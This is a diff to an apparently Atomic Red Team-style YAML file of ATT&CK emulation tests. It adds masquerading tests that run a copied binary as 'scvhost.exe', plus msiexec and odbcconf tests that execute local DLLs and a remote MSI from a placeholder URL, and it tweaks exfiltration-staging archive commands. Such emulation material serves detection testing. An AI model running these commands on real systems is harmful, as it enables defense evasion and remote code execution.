@@ -8540,6 +8540,56 @@ defense-evasion:
         cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe
 
 '
+    - name: Masquerading - non-windows exe running as windows exe
+      description: 'Copies an exe, renames it as a windows exe, and launches it to
+        masquerade as a real windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$PathToAtomicsFolder\\T1036\\bin\\t1036.exe"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Masquerading - windows exe running as different windows exe
+      description: 'Copies a windows exe, renames it as another windows exe, and launches
+        it to masquerade as second windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$env:ComSpec"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:SystemRoot + "\Temp\scvhost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}'
   T1112:
     technique:
       x_mitre_data_sources:
@@ -10237,6 +10287,66 @@ defense-evasion:
         name: command_prompt
         command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
           \n"
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -20397,6 +20507,66 @@ execution:
         name: command_prompt
         command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
           \n"
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /q /i \"#{msi_payload}\" \n"
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "msiexec.exe /y \"#{dll_payload}\" \n"
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -21099,7 +21269,7 @@ execution:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
   T1220:
@@ -22364,7 +22534,7 @@ lateral-movement:
           default: ipconfig
       executor:
         name: powershell
-        command: 'invoke-command -computer_name #{host_name} -scriptblock {#{remote_command}}
+        command: 'invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
 
 '
 collection:
@@ -23344,9 +23514,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           rar a -hp"blue" hello.rar
           dir
     - name: Compress Data and lock with password for Exfiltration with winzip
@@ -23360,9 +23530,9 @@ exfiltration:
         elevation_required: false
         command: |
           path=%path%;"C:\Program Files (x86)\winzip"
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           winzip32 -min -a -s"hello" archive.zip *
           dir
     - name: Compress Data and lock with password for Exfiltration with 7zip
@@ -23375,9 +23545,9 @@ exfiltration:
         name: command_prompt
         elevation_required: false
         command: |
-          mkdir ./tmp/victim-files
-          cd ./tmp/victim-files
-          echo "This file will be encrypted" > ./encrypted_file.txt
+          mkdir .\tmp\victim-files
+          cd .\tmp\victim-files
+          echo "This file will be encrypted" > .\encrypted_file.txt
           7z a archive.7z -pblue
           dir
   T1030:
